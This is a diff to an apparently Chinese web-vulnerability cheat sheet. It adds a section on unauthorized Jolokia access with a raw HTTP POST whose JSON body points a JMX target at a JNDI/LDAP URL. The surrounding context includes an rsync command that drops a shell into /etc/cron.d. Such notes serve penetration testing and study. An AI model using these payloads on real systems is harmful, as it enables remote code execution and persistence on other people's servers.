@@ -58,6 +58,7 @@ web常见漏洞：
 		* [rsync_未授权访问漏洞](#rsync_未授权访问漏洞)
 		* [redis_未授权访问漏洞](#redis_未授权访问漏洞)
 		* [axis_rce漏洞](#axis_rce漏洞)
+		* [jolokia未授权漏洞](#jolokia未授权漏洞)
 		* [CRLF_HTTP头注人](#CRLF_HTTP头注人)
 		* [HPP_参数污染漏洞](#HPP_参数污染漏洞)
 		* [反序列化漏洞](#反序列化漏洞)
@@ -715,6 +716,24 @@ rsync -av shell rsync://tarket-ip:873/path/etc/cron.d/shell
 - [hacden/axis_enable_remote](https://github.com/hacden/Hack/blob/master/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC/axis_enable_remote.py)
 ```
 参考：https://xz.aliyun.com/t/7981
+```
+### jolokia未授权漏洞
+```
+另利用方法：
+POST /jolokia/ HTTP/1.1
+Host: localhost:10007
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 206
+
+{
+    "type" : "read",
+    "mbean" : "java.lang:type=Memory",
+    "target" : { 
+         "url" : "service:jmx:rmi:///jndi/ldap://localhost:9092/jmxrmi"
+    } 
+}
+
+参考：https://xz.aliyun.com/t/2294
 ```
 ### CRLF_HTTP头注人
 > **多出现于302跳转类型,观察url或参数是否存在于返回包中**
